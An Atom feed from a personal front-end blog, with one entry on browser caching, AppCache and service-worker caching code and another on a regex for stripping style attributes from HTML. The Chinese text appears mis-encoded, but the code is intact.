<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Justin&#39;s Words</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://youngdze.co/"/>
  <updated>2017-08-13T11:15:57.000Z</updated>
  <id>http://youngdze.co/</id>
  
  <author>
    <name>Justin Young</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Service workers</title>
    <link href="http://youngdze.co/2017/08/13/service-worker/"/>
    <id>http://youngdze.co/2017/08/13/service-worker/</id>
    <published>2017-08-13T11:08:41.000Z</published>
    <updated>2017-08-13T11:15:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜"><a href="#å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜" class="headerlink" title="å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜"></a>å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜</h2><ul><li>ä»£ç†æœåŠ¡å™¨ç¼“å­˜</li><li>CDN ç¼“å­˜</li><li>æµè§ˆå™¨ç«¯ç¼“å­˜</li></ul><h3 id="æµè§ˆå™¨ç¼“å­˜"><a href="#æµè§ˆå™¨ç¼“å­˜" class="headerlink" title="æµè§ˆå™¨ç¼“å­˜"></a>æµè§ˆå™¨ç¼“å­˜</h3><ul><li>Cache-Control: max-age=3600(s) | no-cache | no-store</li><li>Pragma: no-cache | Pragma</li><li>Expires: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>Last-Modified: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>If-Modified-Since: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>Etag: â€œv2.6â€</li><li>If-None-Match: â€œv2.6â€</li></ul><p>no-cache æ˜¯å…è®¸ç¼“å­˜çš„ï¼Œä½†æ˜¯ä½¿ç”¨ç¼“å­˜ä¹‹å‰å¿…é¡»å’ŒæœåŠ¡å™¨è¿›è¡Œæ–°é²œåº¦å¯¹æ¯”ï¼Œno-store æ‰æ˜¯ç¦æ­¢ç¼“å­˜ã€‚</p><a id="more"></a><h2 id="AppCache"><a href="#AppCache" class="headerlink" title="AppCache"></a>AppCache</h2><p>å¯¹appå†…å­˜ç¼“å­˜çš„æ–¹æ¡ˆï¼Œå…·ä½“è¡¨ç°ä¸ºå½“è¯·æ±‚æŸä¸ªæ–‡ä»¶æ—¶ä¸æ˜¯ä»ç½‘ç»œè·å–è¯¥æ–‡ä»¶ï¼Œè€Œæ˜¯ä»æœ¬åœ°è·å–ã€‚</p><p>index.appcache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">CACHE MANIFEST</div><div class="line">index.html</div><div class="line">index.css</div><div class="line">index.js</div><div class="line">logo.jpg</div><div class="line">NETWORK:</div><div class="line">*</div><div class="line">FALLBACK:</div><div class="line">/404.html</div></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">manifest</span>=<span class="string">"index.appcache"</span>&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œæ¯æ¬¡éƒ½ä¼šè¯·æ±‚ index.appcacheï¼Œå¦‚æœè¯·æ±‚çš„æ–‡ä»¶å­˜åœ¨åœ¨ <code>index.appcache</code> é‡Œé¢ï¼Œå°±æ— éœ€å‘æœåŠ¡å™¨è¯·æ±‚ã€‚</p><h3 id="å¼Šç«¯"><a href="#å¼Šç«¯" class="headerlink" title="å¼Šç«¯"></a>å¼Šç«¯</h3><ul><li>é™¤éæ”¹å˜ index.appcacheï¼Œå¦åˆ™ index.appcache é‡Œé¢çš„æ–‡ä»¶æ°¸è¿œåªä¼šæ¥è‡ªåº”ç”¨ç¼“å­˜</li><li>ä¸åœ¨ appcache ç¼“å­˜åˆ—è¡¨é‡Œé¢çš„æ–‡ä»¶ä¸ä¼šè¢«ç¼“å­˜ï¼Œå†æ¬¡è¯·æ±‚ä¹Ÿä¸ä¼šå»è¯·æ±‚ ğŸ˜¶</li></ul><h2 id="Service-workers"><a href="#Service-workers" class="headerlink" title="Service workers"></a>Service workers</h2><p>æœ¬è´¨ä¸Šå……å½“æµè§ˆå™¨å’Œç½‘ç»œä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ã€‚å®ƒä»¬æ—¨åœ¨èƒ½å¤Ÿåˆ›å»ºæœ‰æ•ˆçš„ç¦»çº¿ä½“éªŒï¼Œæ‹¦æˆªç½‘ç»œè¯·æ±‚å¹¶åŸºäºç½‘ç»œæ˜¯å¦å¯ç”¨åˆ¤æ–­èµ„æºæ˜¯å¦éœ€è¦æ›´æ–°æ¥é‡‡å–é€‚å½“çš„åŠ¨ä½œã€‚ä»–ä»¬è¿˜å…è®¸è®¿é—®æ¨é€é€šçŸ¥å’Œåå°åŒæ­¥APIã€‚</p><p>Service worker è¿è¡Œåœ¨ worker çº¿ç¨‹ï¼Œå’Œé©±åŠ¨åº”ç”¨çš„ JavaScript çº¿ç¨‹æ˜¯åˆ†å¼€çš„ï¼Œä¸¤è€…ç›¸äº’ä¸å—å½±å“ï¼Œæ‰€ä»¥ Service worker æ˜¯ä¸èƒ½è®¿é—® DOM çš„ã€‚</p><p>å®Œå…¨çš„ä½¿ç”¨ Promise å¼‚æ­¥è®¾è®¡ï¼Œä¸å…è®¸ä½¿ç”¨åŒæ­¥ APIã€‚å¿…é¡»åœ¨ HTTPS ä¸‹ä½¿ç”¨ï¼Œä½†æ˜¯è°ƒè¯•çš„æ—¶å€™åœ¨ localhost ä¸‹é¢å¯ä»¥ä½¿ç”¨ HTTPã€‚</p><p>X5 å†…æ ¸æµè§ˆå™¨æ˜¯æ”¯æŒ service worker çš„ã€‚</p><h3 id="Service-workers-ç”Ÿå‘½å‘¨æœŸ"><a href="#Service-workers-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Service workers ç”Ÿå‘½å‘¨æœŸ"></a>Service workers ç”Ÿå‘½å‘¨æœŸ</h3><p><img src="/images/sw-lifecycle.png" alt=""></p><h3 id="Service-workers-ç›‘å¬äº‹ä»¶"><a href="#Service-workers-ç›‘å¬äº‹ä»¶" class="headerlink" title="Service workers ç›‘å¬äº‹ä»¶"></a>Service workers ç›‘å¬äº‹ä»¶</h3><p><img src="/images/sw-events.png" alt=""></p><h3 id="å…¥å£"><a href="#å…¥å£" class="headerlink" title="å…¥å£"></a>å…¥å£</h3><p>è¿™é‡ŒæŒ‡å®šçš„ <code>sw.js</code> æ˜¯åœ¨ worker çº¿ç¨‹å·¥ä½œï¼Œæ‰€ä»¥å®ƒä¸èƒ½è®¿é—® DOMã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">registerSW</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</div><div class="line">   <span class="comment">// æŒ‡å®š service worker æ‰§è¡Œæ–‡ä»¶å’Œå…¶æ§åˆ¶çš„æ–‡ä»¶çš„å­ç›®å½•</span></div><div class="line">    <span class="keyword">return</span> navigator.serviceWorker.register(<span class="string">'/sw.js'</span>, &#123;<span class="attr">scope</span>: <span class="string">'/'</span>&#125;)</div><div class="line">      .then(<span class="function"><span class="params">reg</span> =&gt;</span> &#123;</div><div class="line">        <span class="keyword">if</span> (reg.installing) &#123;</div><div class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'installing'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reg.waiting) &#123;</div><div class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'waiting'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reg.active) &#123;</div><div class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'active'</span>);</div><div class="line">        &#125;</div><div class="line">      &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</div><div class="line">        <span class="built_in">console</span>.error(<span class="string">`Registration failed with <span class="subst">$&#123;error&#125;</span>`</span>);</div><div class="line">      &#125;);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// éœ€è¦ç¼“å­˜çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¯ä»¥é€šè¿‡ Legos ç”Ÿæˆæˆ–è€… Webpack è·å–</span></div><div class="line"><span class="keyword">const</span> assets = [</div><div class="line">  <span class="string">"/bg-header.24e53c7254a141935d68580e59ac3e2a.jpg"</span>,</div><div class="line">  <span class="string">"/i-logo.fe4eaaab959dae955171e85dd6451f01.png"</span>,</div><div class="line">  <span class="string">"/sprite-index.155b7aa999c0b00c8b3041e88dab5e3a.png"</span>,</div><div class="line">  <span class="string">"/bundle.9eb1d16891f485d70cfd.js"</span>,</div><div class="line">  <span class="string">"/style.9eb1d16891f485d70cfd.css"</span></div><div class="line">];</div><div class="line"></div><div class="line"><span class="comment">// ç‰ˆæœ¬å·</span></div><div class="line"><span class="keyword">const</span> CACHE_NAME = (<span class="keyword">new</span> <span class="built_in">Date</span>()).toISOString();</div><div class="line"></div><div class="line"><span class="comment">// æ‰§è¡Œå®‰è£…ï¼Œå°†éœ€è¦ç¼“å­˜çš„æ–‡ä»¶å­˜å…¥ CacheStorage</span></div><div class="line">self.addEventListener(<span class="string">'install'</span>, event =&gt; &#123;</div><div class="line">  event.waitUntil(</div><div class="line">    caches.open(CACHE_NAME)</div><div class="line">    .then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</div><div class="line">      log(<span class="string">'Install'</span>, assets);</div><div class="line">      <span class="keyword">return</span> cache.addAll(assets);</div><div class="line">    &#125;).then(self.skipWaiting)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="è¯·æ±‚æ‹¦æˆª"><a href="#è¯·æ±‚æ‹¦æˆª" class="headerlink" title="è¯·æ±‚æ‹¦æˆª"></a>è¯·æ±‚æ‹¦æˆª</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// è¿™é‡Œä¼šç›‘å¬æµè§ˆå™¨çš„ HTTP è¯·æ±‚ï¼Œå¹¶åšä¸€å±‚æ‹¦æˆª</span></div><div class="line">self.addEventListener(<span class="string">'fetch'</span>, event =&gt; &#123;</div><div class="line">  event.respondWith(</div><div class="line">    caches.match(event.request)</div><div class="line">    .then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</div><div class="line">      <span class="keyword">if</span> (response) &#123;</div><div class="line">        <span class="comment">// å¦‚æœè¿™ä¸ªè¯·æ±‚å·²ç»ç¼“å­˜è¿‡äº†ï¼Œåˆ™ç›´æ¥ä½¿ç”¨ Cache é‡Œé¢çš„ç¼“å­˜</span></div><div class="line">        log(<span class="string">'Use cache'</span>, response.url);</div><div class="line">        <span class="keyword">return</span> response;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="comment">// å¦‚æœæ²¡æœ‰è¯·æ±‚è¿‡ï¼Œå‰å¾€æœåŠ¡å™¨è¯·æ±‚</span></div><div class="line">      <span class="keyword">return</span> fetch(event.request).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</div><div class="line">        <span class="keyword">if</span> (!response || response.status !== <span class="number">200</span> || response.type !== <span class="string">'basic'</span>) &#123;</div><div class="line">          <span class="keyword">return</span> response;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        log(<span class="string">'Fetch'</span>, event.request);</div><div class="line"></div><div class="line">       <span class="comment">// å°†æ–°çš„è¯·æ±‚å›å¤ä¹Ÿç¼“å­˜ä¸‹æ¥</span></div><div class="line">        <span class="keyword">let</span> responseToCache = response.clone();</div><div class="line">        caches.open(CACHE_NAME)</div><div class="line">          .then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</div><div class="line">            cache.put(event.request, responseToCache);</div><div class="line">            log(<span class="string">'Add fetch'</span>, event.request);</div><div class="line">          &#125;);</div><div class="line">      &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</div><div class="line">        log(<span class="string">'Fetch failed'</span>, error);</div><div class="line">      &#125;);</div><div class="line">    &#125;)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="ç¼“å­˜æ›´æ–°"><a href="#ç¼“å­˜æ›´æ–°" class="headerlink" title="ç¼“å­˜æ›´æ–°"></a>ç¼“å­˜æ›´æ–°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * å¦‚æœè¯·æ±‚å›æ¥çš„ sw.js æœ‰æ”¹å˜ï¼Œåˆ™è§¦å‘ activate äº‹ä»¶ï¼Œ</span></div><div class="line"><span class="comment"> * ç„¶åè§¦å‘ install äº‹ä»¶é‡æ–°æ‹‰å–æ–‡ä»¶è¿›è¡Œç¼“å­˜</span></div><div class="line"><span class="comment"> */</span></div><div class="line">self.addEventListener(<span class="string">'activate'</span>, event =&gt; &#123;</div><div class="line">  event.waitUntil(</div><div class="line">    caches.keys().then(</div><div class="line">      keys =&gt; <span class="built_in">Promise</span>.all(</div><div class="line">        keys</div><div class="line">        .filter(<span class="function"><span class="params">key</span> =&gt;</span> key !== CACHE_NAME)</div><div class="line">        .map(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</div><div class="line">          <span class="comment">// æŠŠæ—§çš„ç¼“å­˜å…¨éƒ¨åˆ æ‰ï¼Œä»¥å…å ç”¨ç©ºé—´</span></div><div class="line">          caches.delete(key);</div><div class="line">          log(<span class="string">'Delete cache'</span>, key);</div><div class="line">        &#125;)</div><div class="line">      )</div><div class="line">    ).then(self.skipWaiting)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p><img src="/images/sw1.png" alt=""></p><p><img src="/images/sw2.png" alt=""></p><p><img src="/images/sw3.png" alt=""></p><h3 id="ä¸€äº›æ–°çš„-API"><a href="#ä¸€äº›æ–°çš„-API" class="headerlink" title="ä¸€äº›æ–°çš„ API"></a>ä¸€äº›æ–°çš„ API</h3><p>Request</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">interface</span> Request <span class="keyword">extends</span> Object, Body &#123;</div><div class="line">    readonly cache: RequestCache;</div><div class="line">    readonly credentials: RequestCredentials;</div><div class="line">    readonly destination: RequestDestination;</div><div class="line">    readonly headers: Headers;</div><div class="line">    readonly integrity: <span class="built_in">string</span>;</div><div class="line">    readonly keepalive: <span class="built_in">boolean</span>;</div><div class="line">    readonly method: <span class="built_in">string</span>;</div><div class="line">    readonly mode: RequestMode;</div><div class="line">    readonly redirect: RequestRedirect;</div><div class="line">    readonly referrer: <span class="built_in">string</span>;</div><div class="line">    readonly referrerPolicy: ReferrerPolicy;</div><div class="line">    readonly <span class="keyword">type</span>: RequestType;</div><div class="line">    readonly url: <span class="built_in">string</span>;</div><div class="line">    clone(): Request;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Resopnse</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">interface</span> Response <span class="keyword">extends</span> Object, Body &#123;</div><div class="line">    readonly body: ReadableStream | <span class="literal">null</span>;</div><div class="line">    readonly headers: Headers;</div><div class="line">    readonly ok: <span class="built_in">boolean</span>;</div><div class="line">    readonly status: <span class="built_in">number</span>;</div><div class="line">    readonly statusText: <span class="built_in">string</span>;</div><div class="line">    readonly <span class="keyword">type</span>: ResponseType;</div><div class="line">    readonly url: <span class="built_in">string</span>;</div><div class="line">    clone(): Response;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Cache æ˜¯ä¸€ä¸ªä¸“ä¸ºä¸º Request å’Œ Response å¯¹è±¡æä¾›ç¼“å­˜æœºåˆ¶çš„æ¥å£ï¼Œå®ƒå¯ä»¥æŠŠ Request å’Œ Response å¯¹è±¡ç¼“å­˜èµ·æ¥ï¼Œå¹¶ä¸”æä¾›ä¸€äº›å¾ˆæ–¹ä¾¿çš„ API ä¾›è°ƒç”¨ã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">interface</span> Cache &#123;</div><div class="line"> <span class="comment">// å•ä¸ªæ·»åŠ </span></div><div class="line">    add(request: RequestInfo): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</div><div class="line">    <span class="comment">// æ‰¹é‡æ·»åŠ </span></div><div class="line">    addAll(requests: RequestInfo[]): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</div><div class="line">    <span class="comment">// å•ä¸ªåˆ é™¤</span></div><div class="line">    <span class="keyword">delete</span>(request: RequestInfo, options?: CacheQueryOptions): <span class="built_in">Promise</span>&lt;<span class="built_in">boolean</span>&gt;;</div><div class="line">    <span class="comment">// è·å–å­˜å‚¨çš„æ‰€æœ‰å¯¹è±¡çš„ key</span></div><div class="line">    keys(request?: RequestInfo, options?: CacheQueryOptions): <span class="built_in">any</span>;</div><div class="line">    <span class="comment">// æŸ¥çœ‹æ˜¯å¦å­˜æœ‰è¯¥å¯¹è±¡</span></div><div class="line">    match(request: RequestInfo, options?: CacheQueryOptions): <span class="built_in">Promise</span>&lt;Response&gt;;</div><div class="line">    <span class="comment">// æ‰¹é‡æŸ¥çœ‹æ˜¯å¦å­˜æœ‰è¿™äº›å¯¹è±¡</span></div><div class="line">    matchAll(request?: RequestInfo, options?: CacheQueryOptions): <span class="built_in">any</span>;</div><div class="line">    <span class="comment">// æ·»åŠ å¯¹è±¡</span></div><div class="line">    put(request: RequestInfo, response: Response): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://x5.tencent.com/tbs/guide/serviceworker.html" target="_blank" rel="external">https://x5.tencent.com/tbs/guide/serviceworker.html</a></p><p><a href="https://alistapart.com/article/application-cache-is-a-douchebag" target="_blank" rel="external">https://alistapart.com/article/application-cache-is-a-douchebag</a></p><p><a href="http://harttle.com/2017/04/10/service-worker-update.html" target="_blank" rel="external">http://harttle.com/2017/04/10/service-worker-update.html</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜&quot;&gt;&lt;a href=&quot;#å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜&quot; class=&quot;headerlink&quot; title=&quot;å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜&quot;&gt;&lt;/a&gt;å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ä»£ç†æœåŠ¡å™¨ç¼“å­˜&lt;/li&gt;
&lt;li&gt;CDN ç¼“å­˜&lt;/li&gt;
&lt;li&gt;æµè§ˆå™¨ç«¯ç¼“å­˜&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;æµè§ˆå™¨ç¼“å­˜&quot;&gt;&lt;a href=&quot;#æµè§ˆå™¨ç¼“å­˜&quot; class=&quot;headerlink&quot; title=&quot;æµè§ˆå™¨ç¼“å­˜&quot;&gt;&lt;/a&gt;æµè§ˆå™¨ç¼“å­˜&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cache-Control: max-age=3600(s) | no-cache | no-store&lt;/li&gt;
&lt;li&gt;Pragma: no-cache | Pragma&lt;/li&gt;
&lt;li&gt;Expires: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;Last-Modified: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;If-Modified-Since: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;Etag: â€œv2.6â€&lt;/li&gt;
&lt;li&gt;If-None-Match: â€œv2.6â€&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;no-cache æ˜¯å…è®¸ç¼“å­˜çš„ï¼Œä½†æ˜¯ä½¿ç”¨ç¼“å­˜ä¹‹å‰å¿…é¡»å’ŒæœåŠ¡å™¨è¿›è¡Œæ–°é²œåº¦å¯¹æ¯”ï¼Œno-store æ‰æ˜¯ç¦æ­¢ç¼“å­˜ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Service Workers" scheme="http://youngdze.co/tags/Service-Workers/"/>
    
  </entry>
  
  <entry>
    <title>æ­£åˆ™åŒ¹é… XML é‡Œé¢çš„å±æ€§</title>
    <link href="http://youngdze.co/2016/03/07/regex-match-xml-attribute/"/>
    <id>http://youngdze.co/2016/03/07/regex-match-xml-attribute/</id>
    <published>2016-03-07T01:27:10.000Z</published>
    <updated>2016-12-08T05:25:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘é‡åˆ°äº†è¿™ä¹ˆä¸€æ®µå­—ç¬¦ä¸²ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>vipèŒƒå›´<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>ä¸Šæ¶èµ·å§‹æ—¶é—´<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>ä¸Šæ¶é“å…·ID<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>ä¸‹æ¶æ—¶é—´<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>å……å€¼æ—¶é—´<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure><p>ç°åœ¨éœ€è¦åšçš„æ˜¯æŠŠ <code>tag</code> é‡Œé¢çš„ <code>style</code> å±æ€§å…¨éƒ¨å»æ‰å˜æˆè¿™æ · <code>&lt;p&gt;...&lt;/p&gt;</code>ã€‚</p><p>è¿™é‡Œå¯ä»¥ç”¨çš„æ­£åˆ™æ˜¯ <code>/\sstyle=&quot;[^&quot;]*&quot;/ig</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> str = <span class="string">`&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;vipèŒƒå›´&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;ä¸Šæ¶èµ·å§‹æ—¶é—´&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;ä¸Šæ¶é“å…·ID&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;ä¸‹æ¶æ—¶é—´&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;å……å€¼æ—¶é—´&lt;/p&gt;`</span>;</div><div class="line"><span class="keyword">let</span> reg = <span class="regexp">/\sstyle="[^"]*"/ig</span>;</div><div class="line">str.replace(reg, <span class="string">''</span>);    <span class="comment">// "&lt;p&gt;vipèŒƒå›´&lt;/p&gt;&lt;p&gt;ä¸Šæ¶èµ·å§‹æ—¶é—´&lt;/p&gt;&lt;p&gt;ä¸Šæ¶é“å…·ID&lt;/p&gt;&lt;p&gt;ä¸‹æ¶æ—¶é—´&lt;/p&gt;&lt;p&gt;å……å€¼æ—¶é—´&lt;/p&gt;"</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æˆ‘é‡åˆ°äº†è¿™ä¹ˆä¸€æ®µå­—ç¬¦ä¸²ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Regex" scheme="http://youngdze.co/tags/Regex/"/>
    
